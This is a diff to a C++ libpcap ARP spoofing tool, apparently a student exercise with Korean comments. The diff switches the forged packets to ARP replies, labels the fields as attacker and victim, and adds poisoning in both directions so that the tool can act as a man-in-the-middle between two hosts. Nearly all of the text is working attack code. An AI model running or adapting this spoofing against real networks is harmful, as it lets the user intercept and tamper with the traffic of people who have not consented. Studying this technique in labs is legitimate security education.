@@ -137,25 +137,26 @@ void send_Arp(pcap_t* handle, Mac sender_mac, Ip sender_ip, Mac target_mac, Ip t
 	//왜 멘토님께서 sender, target으로 하라고 하셨는지 뼈저리게 느낌
 	EthArpPacket packet;
 
-	packet.eth_.dmac_ = target_mac;
-	packet.eth_.smac_ = sender_mac;
-	packet.eth_.type_ = htons(EthHdr::Arp);
+   	packet.eth_.dmac_ = target_mac;            // 타겟의 MAC 주소
+    packet.eth_.smac_ = sender_mac;            // 공격자의 MAC 주소
+    packet.eth_.type_ = htons(EthHdr::Arp);    // 이더넷 타입: ARP
 
-	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
-	packet.arp_.pro_ = htons(EthHdr::Ip4);
-	packet.arp_.hln_ = Mac::SIZE;
-	packet.arp_.pln_ = Ip::SIZE;
-	packet.arp_.op_ = htons(ArpHdr::Request);
-	packet.arp_.smac_ = sender_mac;
-	packet.arp_.sip_ = htonl(sender_ip);
-	packet.arp_.tmac_ = target_mac;
-	packet.arp_.tip_ = htonl(target_ip);
+    packet.arp_.hrd_ = htons(ArpHdr::ETHER);   // 하드웨어 타입: 이더넷
+    packet.arp_.pro_ = htons(EthHdr::Ip4);     // 프로토콜 타입: IPv4
+    packet.arp_.hln_ = Mac::SIZE;              // 하드웨어 주소 길이
+    packet.arp_.pln_ = Ip::SIZE;               // 프로토콜 주소 길이
+    packet.arp_.op_ = htons(ArpHdr::Reply);    // ARP 오퍼레이션: Reply
 
-	printf("[INFO] Sending ARP Spoofing Packet:\n");
-	printf("       Source MAC: %s\n", std::string(sender_mac).c_str());
-	printf("       Source IP: %s (Spoofed)\n", std::string(sender_ip).c_str());
-	printf("       Target MAC: %s\n", std::string(target_mac).c_str());
-	printf("       Target IP: %s\n", std::string(target_ip).c_str());
+    packet.arp_.smac_ = sender_mac;            // 공격자의 MAC 주소 (변조된 MAC 주소)
+    packet.arp_.sip_ = htonl(sender_ip);      // 변조된 IP 주소 (타겟이 오인하게 만들 IP)
+    packet.arp_.tmac_ = target_mac;            // 타겟의 MAC 주소 (변조된 MAC 주소의 소유자라고 착각하게 될 대상)
+    packet.arp_.tip_ = htonl(target_ip);       // 타겟의 IP 주소 (스푸핑하려는 대상 IP)
+
+    printf("[INFO] Sending ARP Spoofing Packet:\n");
+    printf("       Attacker MAC: %s\n", std::string(sender_mac).c_str());
+    printf("       Spoofed Source IP: %s (Fake Source IP)\n", std::string(sender_ip).c_str());
+    printf("       Target MAC: %s (Victim's MAC)\n", std::string(target_mac).c_str());
+    printf("       Target IP: %s (Victim's IP)\n", std::string(target_ip).c_str());
 
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 
@@ -209,6 +210,8 @@ int main(int argc, char* argv[]) {
 
 		// 각 sender IP에 대해 ARP 요청을 보내고 MAC 주소를 얻음
 		Mac senderMac = get_sender_mac_address(handle, myMac, myIp, senderIp);
+		Mac targetMac = get_sender_mac_address(handle, myMac, myIp, targetIp);
+
 
 		if (senderMac.isNull()) {
 			fprintf(stderr, "Failed to get MAC address for IP: ");
@@ -219,6 +222,8 @@ int main(int argc, char* argv[]) {
 
 		// 얻은 MAC 주소를 사용하여 ARP 스푸핑 패킷을 보냄
 		send_Arp(handle, myMac, targetIp, senderMac, senderIp);
+		send_Arp(handle, myMac, senderIp, targetMac, targetIp);
+
 
 		std::cout << "[INFO] Completed processing for this pair." << std::endl << std::endl;
 
